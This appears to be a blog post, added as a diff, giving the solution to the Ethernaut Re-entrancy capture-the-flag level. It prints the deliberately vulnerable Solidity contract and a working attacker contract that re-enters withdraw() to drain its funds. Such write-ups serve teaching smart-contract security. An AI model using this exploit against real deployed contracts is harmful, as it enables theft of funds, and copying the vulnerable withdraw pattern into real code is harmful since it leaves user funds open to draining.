@@ -1,0 +1,91 @@
+---
+title: Ethernaut - Re-entrancy - Solution
+date: '2024-05-08'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Re-entrancy CTF
+---
+
+# Ethernaut - Re-entrancy - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+## Exploit
+
+To complete this level, we need to drain all funds from the contract.
+This can be achieved by exploiting the fact that the contract's `withdraw()` function does not follow the checks-effects-interactions pattern and is, therefore, vulnerable to the well-known [reentrancy attack](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#reentrancy).
+
+First, we can check the balance of our victim via:
+
+```bash
+cast balance <your level instance address> --rpc-url $SEP_RPC_URL --ether
+# Result: 0.001000000000000000
+```
+
+To steal 1 Finney from the contract, we can use the following attacker:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint256 _amount) external;
+}
+
+contract ReentranceAttacker {
+    IReentrance public immutable VICTIM;
+    bool public reentered;
+
+    constructor(address victim) {
+        VICTIM = IReentrance(victim);
+    }
+
+    function attack() external payable {
+        VICTIM.donate{value: 1e15}(address(this));
+        VICTIM.withdraw(1e15); // 1e15 = 1 Finney
+    }
+
+    receive() external payable {
+        if (!reentered) {
+            VICTIM.withdraw(1e15);
+            reentered = true;
+        }
+    }
+}
+```
+
+Note that we must send a value of 1 Finney when calling `attack()`.
